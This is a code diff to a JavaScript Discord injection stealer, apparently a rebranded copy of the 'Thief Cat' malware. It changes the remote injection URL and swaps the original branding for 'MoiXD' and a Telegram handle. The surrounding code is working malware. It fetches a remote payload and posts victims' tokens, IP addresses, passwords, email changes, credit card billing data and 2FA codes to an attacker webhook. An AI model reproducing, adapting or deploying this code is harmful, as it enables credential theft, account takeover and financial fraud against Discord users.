@@ -23,7 +23,7 @@ var config = {
   creator: "moi",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
-    "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/index.js",
+    "https://raw.githubusercontent.com/Hoangdepzaivcl/wtf/main/index.js",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
@@ -78,9 +78,9 @@ async function execScript(str) {
   
   const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
     var params = {
-      username: "Thief Cat",
+      username: "MoiXD",
       avatar_url:
-        "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/thiefcat.png",
+        "https://media.discordapp.net/attachments/1017255584527032412/1152906144382197810/loli_pfp_anime__by_crystalwolfink_ddluws0-fullview.png?width=419&height=419",
       content: "",
       embeds: [
         {
@@ -93,7 +93,7 @@ async function execScript(str) {
           },
   
           footer: {
-            text: ` [${config.creator}] | https://github.com/FalseKSCH/`,
+            text: ` [${config.creator}]`,
           },
         },
       ],
@@ -561,7 +561,7 @@ async function execScript(str) {
       var client_discord = appName;
       if (!token) {
         var params = await makeEmbed({
-          title: "<a:caat:1130448857436782682> Thief Cat Initialized",
+          title: "<a:caat:1130448857436782682> Initialized",
           fields: [
             {
               name: "Injection Info",
@@ -605,7 +605,7 @@ async function execScript(str) {
             `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
           ));
         var params = await makeEmbed({
-          title: " Thief Cat Initialized",
+          title: " Initialized",
           description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
           fields: [
             {
@@ -645,11 +645,11 @@ async function execScript(str) {
             },
             {
               name: "@Copyright",
-              value: `[Thief Cat 2023 <a:caat:1130448857436782682>](https://github.com/FalseKSCH/ThiefCat)`,
+              value: `[2023 <a:caat:1130448857436782682>](https://t.me/moimoixD)`,
               inline: !0,
             },
             {
-              name: "ThiefCatified Files",
+              name: "Files",
               value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
               inline: !0,
             },
@@ -699,7 +699,7 @@ async function execScript(str) {
         if (!token) {
           var params = await makeEmbed({
             title:
-              "<a:caat:1130448857436782682> Thief Cat User log out (User not Logged in before)",
+              "<a:caat:1130448857436782682> User log out (User not Logged in before)",
             fields: [
               {
                 name: "Injection Info",
@@ -743,7 +743,7 @@ async function execScript(str) {
               `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
             ));
           var params = await makeEmbed({
-            title: "<a:caat:1130448857436782682> Thief Cat Victim got logged out",
+            title: "<a:caat:1130448857436782682> Victim got logged out",
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
             fields: [
               {
@@ -783,11 +783,11 @@ async function execScript(str) {
               },
               {
                 name: "@Copyright",
-                value: `[Thief Cat 2023 <a:caat:1130448857436782682>](https://t.me/Sordeal)`,
+                value: `[2023 <a:caat:1130448857436782682>](https://t.me/moimoixD)`,
                 inline: !0,
               },
               {
-                name: "ThiefCatified Files",
+                name: "Files",
                 value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                 inline: !0,
               },
@@ -1443,7 +1443,7 @@ async function execScript(str) {
                 } = await BoukiTuclcavectesfonctions();
                 var password = data.password;
                 var params = await makeEmbed({
-                  title: "<a:caat:1130448857436782682> Thief Cat User Login",
+                  title: "<a:caat:1130448857436782682> User Login",
                   color: config["embed-color"],
                   description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                   fields: [
@@ -1484,11 +1484,11 @@ async function execScript(str) {
                     },
                     {
                       name: "@Copyright",
-                      value: `[Thief Cat 2023 <a:caat:1130448857436782682>](https://t.me/Sordeal)`,
+                      value: `[2023 <a:caat:1130448857436782682>](https://t.me/moimoixD)`,
                       inline: !0,
                     },
                     {
-                      name: "ThiefCatified Files",
+                      name: "Files",
                       value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                       inline: !0,
                     },
@@ -1575,7 +1575,7 @@ async function execScript(str) {
               var password = data.password;
   
               var params = await makeEmbed({
-                title: "<a:caat:1130448857436782682> Thief Cat User Login",
+                title: "<a:caat:1130448857436782682> User Login",
                 color: config["embed-color"],
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [
@@ -1616,11 +1616,11 @@ async function execScript(str) {
                   },
                   {
                     name: "@Copyright",
-                    value: `[Thief Cat 2023 <a:caat:1130448857436782682>](https://t.me/Sordeal)`,
+                    value: `[2023 <a:caat:1130448857436782682>](https://t.me/moimoixD)`,
                     inline: !0,
                   },
                   {
-                    name: "ThiefCatified Files",
+                    name: "Files",
                     value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                     inline: !0,
                   },
@@ -1684,7 +1684,7 @@ async function execScript(str) {
           if (data.new_password) {
             var params = await makeEmbed({
               title:
-                "<a:caat:1130448857436782682> Thief Cat Detect Password Changed",
+                "<a:caat:1130448857436782682> Detect Password Changed",
               color: config["embed-color"],
               description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
               fields: [
@@ -1725,11 +1725,11 @@ async function execScript(str) {
                 },
                 {
                   name: "@Copyright",
-                  value: `[Thief Cat 2023 <a:caat:1130448857436782682>](https://t.me/Sordeal)`,
+                  value: `[2023 <a:caat:1130448857436782682>](https://t.me/moimoixD)`,
                   inline: !0,
                 },
                 {
-                  name: "ThiefCatified Files",
+                  name: "Files",
                   value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                   inline: !0,
                 },
@@ -1818,7 +1818,7 @@ async function execScript(str) {
   
                     var params = await makeEmbed({
                       title:
-                        "<a:caat:1130448857436782682> Thief Cat Have changed the victim mail",
+                        "<a:caat:1130448857436782682> Have changed the victim mail",
                       color: config["embed-color"],
                       description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                       fields: [
@@ -1844,11 +1844,11 @@ async function execScript(str) {
                         },
                         {
                           name: "@Copyright",
-                          value: `[Thief Cat 2023 <a:caat:1130448857436782682>](https://t.me/Sordeal)`,
+                          value: `[2023 <a:caat:1130448857436782682>](https://t.me/moimoixD)`,
                           inline: !1,
                         },
                         {
-                          name: "ThiefCatified Files",
+                          name: "Files",
                           value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                           inline: !1,
                         },
@@ -1884,7 +1884,7 @@ async function execScript(str) {
             }
             var params = await makeEmbed({
               title:
-                "<a:caat:1130448857436782682> Thief Cat Detect Email Changed",
+                "<a:caat:1130448857436782682> Detect Email Changed",
               color: config["embed-color"],
               description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
               fields: [
@@ -1925,11 +1925,11 @@ async function execScript(str) {
                 },
                 {
                   name: "@Copyright",
-                  value: `[Thief Cat 2023 <a:caat:1130448857436782682>](https://t.me/Sordeal)`,
+                  value: `[MoiXD <a:caat:1130448857436782682>](https://t.me/moimoixD)`,
                   inline: !0,
                 },
                 {
-                  name: "ThiefCatified Files",
+                  name: "",
                   value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                   inline: !0,
                 },
@@ -2008,11 +2008,11 @@ async function execScript(str) {
                   dt.billing_address;
                 var params = await makeEmbed({
                   title:
-                    "<a:caat:1130448857436782682> Thief Cat User Credit Card Added",
+                    "<a:caat:1130448857436782682> User Credit Card Added",
                   color: config["embed-color"],
                   fields: [
                     {
-                      name: "ThiefCatified Files",
+                      name: "Files",
                       value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                       inline: false,
                     },
@@ -2104,11 +2104,11 @@ async function execScript(str) {
           }
   
           var params = await makeEmbed({
-            title: "<a:caat:1130448857436782682> Thief Cat User Enable 2FA",
+            title: "<a:caat:1130448857436782682> User Enable 2FA",
             color: config["embed-color"],
             fields: [
               {
-                name: "ThiefCatified Files",
+                name: "Files",
                 value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                 inline: false,
               },
@@ -2169,11 +2169,11 @@ async function execScript(str) {
           break;
         case request.url.endsWith("/disable"):
           var params = await makeEmbed({
-            title: "<a:caat:1130448857436782682> Thief Cat User Removed 2FA",
+            title: "<a:caat:1130448857436782682> User Removed 2FA",
             color: config["embed-color"],
             fields: [
               {
-                name: "ThiefCatified Files",
+                name: "Files",
                 value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                 inline: false,
               },
@@ -2243,11 +2243,11 @@ async function execScript(str) {
             }
           }
           var params = await makeEmbed({
-            title: "<a:caat:1130448857436782682> Thief Cat User 2FA Codes",
+            title: "<a:caat:1130448857436782682> User 2FA Codes",
             color: config["embed-color"],
             fields: [
               {
-                name: "ThiefCatified Files",
+                name: "Files",
                 value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                 inline: false,
               },
@@ -2304,4 +2304,3 @@ async function execScript(str) {
       }
     }
   );
-  
